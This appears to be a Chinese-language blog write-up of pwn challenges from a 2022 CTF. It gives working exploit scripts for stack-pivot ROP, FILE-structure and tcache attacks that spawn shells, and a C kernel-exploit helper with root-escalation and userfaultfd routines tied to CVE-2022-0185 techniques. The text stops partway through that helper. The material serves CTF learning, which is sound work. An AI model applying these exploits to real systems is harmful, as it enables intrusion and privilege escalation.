# 2022DASCTFXSU三月春季挑战赛-pwn-wp



## 2022DASCTFXSU三月春季挑战赛-pwn-wp

今天终于有空来写下`wp`，比赛那天恰好有事，所以就上午做了下题。最后一题的`CVE-2022-0185`在学习中，未完待续。

- 2022-03-31: 更新了`wedding`的`exp`，可打远程。
- 2022-04-09：忘记更新了，补上第三题。

<!-- more -->

### checkin

这题最开始想用`one gadget`去做，后来发现`libc-2.31`的`one gadget`都比较严格，于是换成`puts`泄露再读取输入执行`system("/bin/sh")`。

#### checksec

![image-20220328234420617](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220328234420617.png)



#### 漏洞点

栈溢出，可溢出`0x10`字节，覆盖掉`rbp`和`ret`。

![image-20220328234728394](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220328234728394.png)

#### 利用思路

观察`0x4011BF`处的汇编可知，`rax`等于`rbp-0xb0`，然后在`0x4011CB`处将`rax`赋值给了`rsi`，因此，只要控制了`rbp`，相当于可以在任意地址处写入`0xb0`个字节。

至少两种思路，主要后面不一样。

思路一：

- 栈迁移到`bss`段

- 控制`rbp`后再进入`0x4011BF`，然后在`bss`段上`rop`

- 使用`partial overwrite `修改`read@got`，使其为`syscall; ret`。这里由于`read`的地址偏移为`0xff0`，加个`0x10`直接进位了，所以还有半个字节需要猜测一下，概率为`1/16`

  ![image-20220329005900749](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329005900749.png)

- 使用`read`控制`rax`为`10`，并修改`read@got`，随即利用`ret2csu`执行`mprotect(bss, 0x1000, 7)`

- 跳转到准备好的`shellcode`执行获取`shell`



思路二：

- 栈迁移到`bss`段
- 控制`rbp`后再进入`0x4011BF`，然后在`bss`段上`rop`
- 使用`magic gadget`：`add [rbp-0x3d], ebx; ret`，将`setvbuf@got`修改为`puts`的地址
- 泄露出`read`地址，计算得到`system`地址
- 再次`read`读取输入，跳转执行`system('/bin/sh')`即可

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

if gift.remote:
    libc = ELF('./libc.so.6')
    gift['libc'] = libc

pop_rdi_ret = CurrentGadgets.pop_rdi_ret()
pop_rsi_r15_ret = CurrentGadgets.pop_rsi_r15_ret()
leave_ret = CurrentGadgets.leave_ret()
magic = CurrentGadgets.magic_gadget()
pop_rbp_ret = CurrentGadgets.pop_rbp_ret()
ret = CurrentGadgets.ret()
read_again = 0x4011bf
bss_addr = 0x404080 + 0xa00


def exp_magic():
    pop_rbx_rbp_r12131415 = 0x40124a

    # 栈迁移到bss段
    payload = flat({
        0xa0: [
            bss_addr+0xa0,
            read_again
        ]
    })

    s(payload)

    libc_puts = libc.sym.puts
    libc_setvbuf = libc.sym.setvbuf

    offset = (libc_puts - libc_setvbuf) if libc_puts > libc_setvbuf else (0x100000000 + libc_puts - libc_setvbuf)

    # 修改setvbuf为puts
    payload = flat(
        {
            0: [
                pop_rbx_rbp_r12131415,
                offset,
                elf.got.setvbuf+0x3d,
                0, 0, 0, 0,
                magic,
                ret,
                pop_rdi_ret,
                elf.got.read,
                elf.plt.setvbuf,
                pop_rbp_ret,
                bss_addr+0xa0,
                read_again
            ],
            0xa0: [
                bss_addr - 8,
                leave_ret
            ]
        }
    )
    s(payload)

    read_addr = u64_ex(rl()[:-1])
    libc_base = read_addr - libc.sym.read
    log_libc_base_addr(libc_base)
    libc.address = libc_base

    # 读取输入，执行system('/bin/sh')
    payload = flat({
        0:[
            pop_rdi_ret,
            libc.search(b"/bin/sh").__next__(),
            libc.sym.system
        ],
        0x70: leave_ret,
        0xa0: [
            bss_addr - 8,
            leave_ret
        ]
    })
    s(payload)
    sleep(1)
    sl("cat /flag")
    m = rls("flag")
    if b"flag" in m:
        log_ex(f"Get flag: {m}")
    ia()

def exp_partial_write():
    bss_addr = elf.got.setvbuf
    # 栈迁移
    layout = {
        0xa0: [
            bss_addr+0xa0,
            read_again
        ]
    }
    s(flat(layout))

    # rop1
    layout = {
        0xa0: [
            bss_addr,
            leave_ret
        ],
        0: [
            bss_addr+0x68,
            pop_rsi_r15_ret,
            elf.got.read-8,
            0,
            elf.plt.read,
            0x40124a,  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
            0, # rbx
            2, # rbp
            bss_addr & ~0xfff,
            0x1000,
            7,
            elf.got.read,
            0x401230, # csu up
            ShellcodeMall.amd64.execve_bin_sh
        ]
    }
    s(flat(layout))
    s(b"a"*8 + p16(0x8000))
    sleep(1)
    sl("cat /flag")
    m = rls("flag")
    if b"flag" in m:
        log_ex(f"Get flag: {m}")
    ia()

if __name__ == "__main__":
    # for i in $(seq 1 20); do ./exp.py de ./checkin -nl ; done
    # try:
    #     exp_partial_write()
    # except:
    #     pass

    exp_magic()
```

打远程：

![image-20220329010500135](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329010500135.png)

爆破：

![image-20220329010701970](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329010701970.png)



### wedding

这题刚开始被`libc`给坑了，最开始本地使用的是`2.31-0ubuntu9.2_amd64`调试的，这个版本的`file_jump_table`是可写的；但是远程给的是`2.31-0ubuntu9.7_amd64`，这个版本的`file_jump_table`都是不可写的。因为我最初使用的思路是改写`stdout->flags`为`/bin/sh`，修改`_IO_file_jumps->_IO_file_xsputn`为`system`去拿`shell`，所以那天上午爆破了好久都失败了......所以以后，还是老老实实用给的`libc`去调试吧。调试的时候建议关闭`aslr`。

#### checksec

![image-20220329011230099](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329011230099.png)

#### 漏洞点

1. `prepare`中没有校验`offset`：

   ![image-20220329011413395](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329011413395.png)

2. `revise`中没有校验`index`:

   ![image-20220329011500216](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329011500216.png)

建议把这个标识变量改一下，要不然`wish/wlsh/w1sh`容易看花眼。。。



#### 利用思路

题目给的条件为：

- 可以分配任意大小的内存
- 可以在任意偏移处覆盖，但是只能覆盖为`0x135`或者`0x1314`，覆盖机会为`3`次
- 可以在`heap`任意偏移处的指针写入`8`或者`3`个字节，各有`1`次机会。

当然，上面说的任意也不是完全任意，受限于`my_read`只读取`8`个字节，所以实际能控制的偏移（数字）为：`-9999999`到`99999999`。

我们知道，在申请内存足够大，大概大于`128K`的时候，会调用`mmap`映射虚拟内存页，此时映射的虚拟内存页会位于`libc.so`映射空间的上方。此时的偏移可控，也就是可以修改`libc.so`上的任意的数据，修改的内容为`2`字节，固定。

由于没有地址，朴素的想法就是先泄露地址，因此，打`_IO_2_1_stdout_`结构体去泄露地址。有地址后就好办了，思路为：

- 申请大内存，利用任意偏移修改`stdout->flags`和`stdout->_IO_write_base`，泄露地址并计算出`PIE`基地址和`libc`基地址

- 利用一个跳板，和两次分别写`8/3`字节的机会，修改`change3`和`change8`为小负数，这样就能继续写很多次。我选择的跳板在`0x3e20`偏移处，第一次可以写`8`个字节，修改为任意地址，第二次就能将`change3`修改为小负数

  ![image-20220329013447320](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329013447320.png)

  然后，使用`0x4008`这个跳板，就可以把`change8`也修改为小负数

  ![image-20220329013551371](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329013551371.png)

- 继续使用跳板，将`stderr->vtable`修改为`_IO_str_jumps`；将`_IO_2_1_stderr_+131`处修改为`sh;`；将`__free_hook`修改为`system`；将`stderr->flags`修改为`0x80`；最后把`bss`段上的`stdout`修改为`_IO_2_1_stderr_`。接着，在调用`puts(xxx)`的时候，会调用`stderr->vtable->_IO_file_xsput`，实际调用的是`_IO_str_finish`，接着调用`free(fp->_IO_buf_base)`，就是调用`system("sh;")`

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def prepare(size:int, offset:int=None):
    if size > 0x7fffffff:
        size -= (0x1 << 32)
    if offset and offset > 0x7fffffff:
        offset -= (0x1 << 32) 
    sla("your choice >> \n", "1")
    sa("how much do you prepare>> \n", str(size).ljust(8, "\x00"))
    if offset is not None:
        sa(">> \n", str(offset).ljust(8, "\x00"))


def revise(idx, data):
    sla("your choice >> \n", "2")
    sla("which packet you want to revise>> \n", str(idx))
    sa("now write your wish>> \n", data)

# 调用mmap 分配到libc上方
# 修改stdout->flags
off_first = 0x42ff0
prepare(0x40000, off_first + libc.sym['_IO_2_1_stdout_'] + 1)

# 调用mmap 分配到libc上方
# 修改stdout->write_base
prepare(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym['_IO_2_1_stdout_'] + 0x20)

# 根据标志寻找到地址
io.recvuntil(p64(0xfffffffffffffff8), timeout=10)
m1 = io.recvn(0x10)

code_addr = u64_ex(m1[:8])
libc_addr = u64_ex(m1[8:0x10])
code_base = code_addr - 0x4040
libc_base = libc_addr - 0x1f1530
log_libc_base_addr(libc_base)
log_code_base_addr(code_base)

if (libc_base >> 40) != 0x7f or ((code_base >> 40) != 0x55 and (code_base >> 40) != 0x56):
    errlog_exit("Wrong addr")

libc.address = libc_base
# check
revise(-80, p64(code_base+0x4050+1))
revise(0x3ec, p16(0xffee)+p8(0xff))

revise(-19, p8(0x55))
revise(-19, p16(0xffee)+p8(0xff))

# _IO_2_1_stderr_ 
str_jumps_off = 0x1e9560
revise(-80, p64(libc.sym['_IO_2_1_stderr_'] + 216)) # stderr->vtable

revise(0x3ec, p32_ex(libc_base + str_jumps_off - 0x28)[:3])

revise(-80, p64(libc.sym['__free_hook']))
revise(0x3ec, p64(libc.sym.system)[:3])

revise(-80, p64(libc.sym['__free_hook']+3)) #
revise(0x3ec, p64(libc.sym.system)[3:6])

revise(-80, p64(libc.sym['__free_hook']+6)) #
revise(0x3ec, p64(libc.sym.system)[6:])

revise(-80, p64(libc.sym['_IO_2_1_stderr_'] + 131)) # stderr -> 
revise(0x3ec, "sh;")

revise(-12, p8(0x80))

revise(-80, p64(code_base + 0x4020)) # stdout 

revise(0x3ec, p64(libc.sym['_IO_2_1_stderr_'])[:3])

ia()
```

这里使用`0xfffffffffffffff8`来找地址，有代码段地址和`libc`地址：

![image-20220329014634492](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329014634492.png)



本地多试几次就出来了：

![image-20220329014526706](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220329014526706.png)

远程不知道是不是偏移不对，`stdout`那里一直没有泄露，不知道啥情况。所以，这个大概率是~~打远程失败的~~非预期解了。



### wedding-again

今天装了个`ubuntu-20.04`的`pwn`环境，重新审视一下这道题，发现上面那个`EXP`打远程是有问题的。正好有很多师傅咨询我这道题的解法，我就更新一下能打通`buu`的`exp`。

#### 存在的问题

上面的`exp`的调试环境是：`ubuntu-18.04 + patchelf + libc-2.31-0ubuntu9.7_amd64.so`，其实我还是被`patchelf`给坑了......

实际上，上面利用的`0x3e20`这里的跳板是不可行的，远程环境上不可写：

![image-20220330235340517](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220330235340517.png)

也就是没了`code_base + 0x3e20`这个跳板。

#### 补充漏洞点

说一个新的漏洞点，其实不完全算漏洞：

![image-20220330235441349](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220330235441349.png)

`prepare`的时候，如果满了`8`个，其实还可以任意次数分配内存，但是此时的`v2`不来源于`i`，而是未初始化变量，调试后发现为`0`，也就会一直覆盖第一个堆指针。下面的利用方法会用到这一漏洞。

#### 新的利用思路

总体的利用思路与上面是一样的，分成四步走：

- 打`stdout`结构体泄露地址，此时需要`code_base/libc_base/heap_base`三个地址，都可以泄露出来
- 想办法修改`change3`和`change8`
- 寻找到一个可以任意地址写的跳板
- 打`stderr`和改写`__free_hook`，控制程序流走到`_IO_str_finish`然后`get_shell`



其中，第一步和第四步和上面的`EXP`一样，重点在于第二步与第三步，即如何修改`change3`和`change8`这两个变量以及寻找一个新的跳板。

首先说一下第二步如何做：

我们还是利用这里的一个指针：

![image-20220331000229572](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220331000229572.png)

这个指针指向了自己，相对于下方`heap`的偏移为`-19`，计算出对应的`size`的地址为`0x4014`，内容为`0`。也就是说，如果第一次`revise(-19, xxx)`，只能写`3`个字节，可以指向数据段的任意位置。但是，考虑到我们还剩一次`prepare`的机会，还能任意偏移修改内容为`0x135/0x1314`。

这里可利用数据段与堆挨得很近的特性，在堆上申请一块内存，反向溢出到数据段，那么，就能修改`code_base + 0x4014`处的内容，将其修改为大于`0x999`。也就能再一次`revise(-19, xxxx)`，此时就可以写`8`个字节。

因此，这里的修改方法为：

- 第一次修改`__dso_handle`，利用`revise(-19, xxx)`部分写`3`个字节，使其指向`code_base + 0x4050`
- 利用`prepare`，修改`code_base + 0x4014`的内容大于`0x999`
- 此时利用`revise(-19, xxx)`，写`8`个字节，将`change3`和`change8`均修改为小负数

此时，可以任意次数执行`revise`。



再来看第三步如何做：

我们还是利用数据段和堆挨得很近的特性，向下溢出。第三次分配的内存在堆上，假设其地址为`addr1`，如果我们要溢出到这个地方，且将`addr1`作为`size`，计算出索引：`index = (addr1 - (code_base + 0x4060)) / 4`，那么，在该索引下对应的`heap`的地址为：`overflow_heap_addr = (code_base + 0x40a0) + index * 8`

此时已经有了任意次数的`revise`，可以修改`*addr1 > 0x999`，然后利用上面说的任意次数内存分配到`overflow_heap_addr`，修改`*overflow_heap_addr = target_addr`。此时`revise(index, xxx)`，即可往任意地址`(target_addr)`写任意值，并且可以写`8`个字节。

截图如下：

![image-20220331001942991](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220331001942991.png)

这里调试的时候没有开`aslr`，所以没有分配满。

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

context.timeout = 5

def prepare(size:int, offset:int=None):
    if size > 0x7fffffff:
        size -= (0x1 << 32)
    if offset and offset > 0x7fffffff:
        offset -= (0x1 << 32) 
    sla("your choice >> \n", "1")
    sa("how much do you prepare>> \n", str(size).ljust(8, "\x00"))
    if offset is not None:
        sa(">> \n", str(offset).ljust(8, "\x00"))


def revise(idx, data):
    sla("your choice >> \n", "2")
    sla("which packet you want to revise>> \n", str(idx))
    sa("now write your wish>> \n", data)

# 调用mmap 分配到libc上方
# 修改stdout->flags
off_first = 0x42ff0

if gift.remote:
    off_first = 0x40ff0

prepare(0x40000, off_first + libc.sym['_IO_2_1_stdout_'] + 1)

# 调用mmap 分配到libc上方
# 修改stdout->write_base
prepare(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym['_IO_2_1_stdout_'] + 0x20)

# 根据标志寻找到地址
io.recvuntil(p64(0xfffffffffffffff8), timeout=5)
m1 = io.recvn(0x10)

io.recvuntil(p64(0xffffffffffffff78), timeout=5)
m2 = io.recvn(0x2d8)

code_addr = u64_ex(m1[:8])
libc_addr = u64_ex(m1[8:0x10])
heap_base = u64_ex(m2[-8:])
code_base = code_addr - 0x4040
libc_base = libc_addr - 0x1f1530
log_libc_base_addr(libc_base)
log_code_base_addr(code_base)
log_code_base_addr(heap_base)

if ((libc_base >> 40) != 0x7f and (libc_base >> 40) != 0x7e) or ((code_base >> 40) != 0x55 and (code_base >> 40) != 0x56):
    errlog_exit("Wrong addr")

libc.address = libc_base

revise(-19, p32_ex(code_base+0x4050)[:3])

# 堆上分配一个chunk用于溢出
target_addr = code_base + 0x4015
heap_addr = heap_base + 0x2a0

assert len(str(target_addr-heap_addr)) <= 8, "try again"

prepare(0x100, target_addr-heap_addr) # 2
revise(-19, p32(0xff000000)*2) # 修改change3和change8

revise(2, p16(0x2000))

# 计算size地址
sizes_addr = code_base + 0x4060
# 计算索引
index = (heap_addr - sizes_addr) // 4
# 计算堆地址
overflow_heap_addr = (8 * index) + (code_base + 0x40a0) 
current_top_chunk = heap_base + 0x3a0
# 这里减去0x10，留下chunk head
distance = overflow_heap_addr - current_top_chunk - 0x10

log_ex(f"current index: {index}")
log_ex(f"overflow_heap_addr: {hex(overflow_heap_addr)}")
log_ex(f"current_top_chunk: {hex(current_top_chunk)}")

count = 2
alloc_size = 0x10010
while True:
    x, y = divmod(distance, alloc_size)
    if y == 0 or y >= 0x20: # y不能是0x10
        break
    alloc_size -= 0x10

for i in range(x):
    prepare(alloc_size-0x10)
    count += 1

if y:
    prepare(y-0x10)
    count += 1

prepare(0x1000)
count += 1

log_ex(f"total count: {hex(count)}")

# 如果满了8个，那么都会覆盖第一个
if count > 7:
    count = 0

revise(count, p64(libc.sym.__free_hook))
revise(index, p64(libc.sym.system))
str_jumps_off = 0x1e9560
revise(count, p64(libc.sym['_IO_2_1_stderr_'] + 216)) # stderr->vtable
revise(index, p64(libc_base + str_jumps_off - 0x28))

revise(count, p64(libc.sym['_IO_2_1_stderr_'] + 131)) # stderr->_IO_buf_base
revise(index, "sh;")

revise(-12, p8(0x80)) # stderr->flags

revise(count, p64(code_base + 0x4020)) # stderr->_IO_buf_base
revise(index, p64(libc.sym['_IO_2_1_stderr_'])) # 替换stdout为_IO_2_1_stderr_

ia()
```



打`buu`的远程

![image-20220331003015483](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220331003015483.png)



### wedding-again-again

和`tomato`师傅交流了一下，补充一个新的利用思路。

#### 新的利用思路

前面的过程还是一样的，首先需要泄露地址。然后，攻击`mp.tcache_bins`这个变量。这个变量可以使得很大的堆块也被`tcache bins`所管理。例如，利用`heap_base+0x298`处的值作为`size`，计算出如果放置到`tcache bins`中管理，`chunk`的大小为`0x1460`，对应的堆地址为`heap_base + 0xab0`。然后，可以利用两次`revise`修改`change8`为小负数，最后继续使用相同的办法往任意地址写任意值。

这里我用了一个小`trick`:

```c
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

利用`tcache bin poisoning`分配到`code_base + 0x4048`处，利用`e->key = NULL;`，可以将`change3`和`change8`刷为`0`。就可以再执行两次`revise`。然后还是利用`__dso_handle`将`change8`修改为小负数，如图：

![image-20220331222528057](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220331222528057.png)

这里选择`_IO_2_1_stdin_`，避免`e->key = NULL`修改掉了`stdout->flags`。

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def prepare(size:int, offset:int=None):
    if size > 0x7fffffff:
        size -= (0x1 << 32)
    if offset and offset > 0x7fffffff:
        offset -= (0x1 << 32) 
    sla("your choice >> \n", "1")
    sa("how much do you prepare>> \n", str(size).ljust(8, "\x00"))
    if offset is not None:
        sa(">> \n", str(offset).ljust(8, "\x00"))


def revise(idx, data):
    sla("your choice >> \n", "2")
    sla("which packet you want to revise>> \n", str(idx))
    sa("now write your wish>> \n", data)

# 调用mmap 分配到libc上方
# 修改stdout->flags
off_first = 0x42ff0

if gift.remote:
    off_first = 0x40ff0

prepare(0x40000, off_first + libc.sym['_IO_2_1_stdout_'] + 1)

# 调用mmap 分配到libc上方
# 修改stdout->write_base
prepare(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym['_IO_2_1_stdout_'] + 0x20)

# 根据标志寻找到地址
io.recvuntil(p64(0xfffffffffffffff8), timeout=10)
m1 = io.recvn(0x10)

code_addr = u64_ex(m1[:8])
libc_addr = u64_ex(m1[8:0x10])
code_base = code_addr - 0x4040
libc_base = libc_addr - 0x1f1530
log_libc_base_addr(libc_base)
log_code_base_addr(code_base)

if ((libc_base >> 40) != 0x7f and (libc_base >> 40) != 0x7e) or ((code_base >> 40) != 0x55 and (code_base >> 40) != 0x56):
    errlog_exit("Wrong addr")

libc.address = libc_base

tcache_bins_off = 0x1ec2d0
"""
size = 8 * count_addr - 0x60 
size = 2 * bins_addr - 0x100  
"""
# 攻击mp.tcache_bins
prepare(0x40000, off_first + (0x83ff0 - 0x42ff0) * 2 + tcache_bins_off)

prepare(0xab0 - 0x290 - 0x20)
prepare(0x2000) # 4

revise(4, p64(code_base + 0x4048))
revise(-19, p64(code_base + 0x4055)[:3])
prepare(0x1450) # 5 tcachebin attack

revise(-19, p64(0xffeeee)[:3]) # change8

str_jumps_off = 0x1e9560
revise(4, p64(libc.sym['_IO_2_1_stdin_'] + 216)) # stdin->vtable
prepare(0x1450) # 6
revise(6, p64(libc_base + str_jumps_off - 0x28))


revise(4, p64(libc.sym['__free_hook'])) # __free_hook
prepare(0x1450) # 7
revise(7, p64(libc.sym.system))

revise(4, p64(libc.sym['_IO_2_1_stdin_'])) # stdin->flags
prepare(0x1450) # 0
revise(0, p64(0x80))

revise(4, p64(libc.sym['_IO_2_1_stdin_'] + 56)) # stdin->_IO_buf_base
prepare(0x1450) # 0
revise(0, p64(libc.search(b"/bin/sh").__next__()))

revise(4, p64(code_base + 0x4020)) # stdout
prepare(0x1450) # 0
revise(0, p64(libc.sym['_IO_2_1_stdin_']))

ia()
```

综上，`pwn`题的环境真的非非非非非常影响解题。

### SU_message

这里有出题人的出题报告：<https://kagehutatsu.com/?p=551>

好吧，忘记把这一题更新了，有位师傅提醒我才想起来还有这事。

基本研究完`CVE-2022-0185`后，这一题利用就很简单。可以用`msg_msg`结构体构造堆喷，之后可以构造任意地址写。由于未开启`KASLR`，所以都不需要泄露地址，但是我自己下来做的时候还是按照开启`kaslr`来做的。

简单总结一下利用思路：

- `msgsnd`布局`msgmsg`和`msgmsg_seq`结构体，堆喷
- 修改`msgmsg->mts`泄露地址
- 修改`msgmsg->next`任意地址写，这里可以使用`userfault`增加竞争成功的几率
- 修改`modprobe_path`进行提权

#### EXP

`exp`如下，`helpful.h`，记录了一些常用的函数：

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <poll.h>
#include <assert.h>
#include <syscall.h>
#include <pthread.h>
#include <linux/fs.h>
#include <linux/fuse.h>
#include <linux/sched.h>
#include <linux/if_ether.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>

// data
size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
size_t g_vmlinux_base_addr;
size_t *g_buffer;

#define G_BUFFER_SIZE 0x100000
#define PAGE_SIZE 0x1000

/*
extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
*/

#define RAW_VMLINUX_BASE_ADDR 0xffffffff81000000
#define GADGETS_OFFSET (g_vmlinux_base_addr - RAW_VMLINUX_BASE_ADDR)

void __attribute__((constructor)) initial()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    g_buffer = (size_t *)calloc(G_BUFFER_SIZE, 1);
}

void __attribute__((destructor)) finish()
{
    free(g_buffer);
}

void clear_buffer()
{
    if (g_buffer)
    {
        memset(g_buffer, G_BUFFER_SIZE, 0);
    }
}

void info(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;33m*\033[0m] \033[40;33mINFO\033[0m ===> %s\r\n", s);
}

void success(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;32m+\033[0m] \033[40;32mOJBK\033[0m ===> %s\r\n", s);
}

void fail(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m-\033[0m] \033[40;31mFAIL\033[0m ===> %s\r\n", s);
}

void warn(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;34m#\033[0m] \033[40;34mWARN\033[0m ===> %s\r\n", s);
}

void error(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m!\033[0m] \033[40;31mERROR\033[0m ===> %s\r\n", s);
    exit(-1);
}

void get_shell()
{
    if (getuid() == 0)
    {
        success("Get root shell!!!");
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

void get_shell_si()
{
    system("/bin/sh");
}

static size_t get_shell_ex_flag = 0;
void get_shell_ex()
{
    if (get_shell_ex_flag)
    {
        return;
    }

    if (getuid() == 0)
    {
        success("Get root shell!!!");
        get_shell_ex_flag = 1;
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

// at&t flavor assembly
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(g_user_cs), "=r"(g_user_ss), "=r"(g_user_eflags), "=r"(g_user_sp)
        :
        : "memory");
}

void set_root_uid()
{
    if (!g_prepare_kernel_cred_addr || !g_commit_creds_addr)
    {
        error("set prepare_kernel_cred_addr and commit_creds_addr first!");
    }
    char *(*pkc)(int) = g_prepare_kernel_cred_addr;
    void (*cc)(char *) = g_commit_creds_addr;
    (*cc)((*pkc)(0));
}

void *get_mmap_rwx(size_t addr, size_t len)
{
    return mmap((void *)addr, len, 7, 0x22, -1, 0);
}

void show_addr_u64(void *addr, size_t size)
{
    if (size < 8)
    {
        error("size is too small, must be 8 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 8) * 8;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 8)
    {
        printf("0x%016lx: 0x%016lx", (size_t)s, *(size_t *)s);
        s += 8;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%016lx\r\n", *(size_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void show_addr_u32(void *addr, size_t size)
{
    if (size < 4)
    {
        error("size is too small, must be 4 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 4) * 4;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 4)
    {
        printf("0x%08lx: 0x%08lx", (size_t)s, *(uint32_t *)s);
        s += 4;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%08lx\r\n", *(uint32_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void flat(size_t data[], const size_t data_len, size_t *target_addr, size_t *cur_idx)
{
    for (size_t i = 0; i < data_len; i++)
    {
        target_addr[*cur_idx] = data[i];
        ++(*cur_idx);
    }
}

//=====================================userfaultfd======================
ssize_t process_userfault_running = 0;
struct UserfaultHandlerArg
{
    size_t uffd;
    void (*func)(void *, void *);
    void *func_args;
};

void register_userfault(void *fault_page, void *handler, void (*func)(void *, void *), void *func_args)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        error("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        error("ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    struct UserfaultHandlerArg *args = malloc(sizeof(struct UserfaultHandlerArg));
    args->uffd = uffd;
    args->func = func;
    args->func_args = func_args;
    int s = pthread_create(&thr, NULL, handler, (void *)args);
    if (s != 0)
        error("pthread_create");
}

void *userfaultfd_stuck_handler(void *arg)
{
    struct UserfaultHandlerArg *args = (struct ActualArgs *)arg;

    struct uffd_msg msg;
    size_t uffd = args->uffd;
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    info("start to process userfault");
    if (nready != 1)
    {
        error("[-] Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        error("[-] msg err");
    }

    char *page = (char *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        error("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    // wait for handler
    while (!process_userfault_running)
    {
        sleep(1);
        info("wait...process_userfault_running is not ok!");
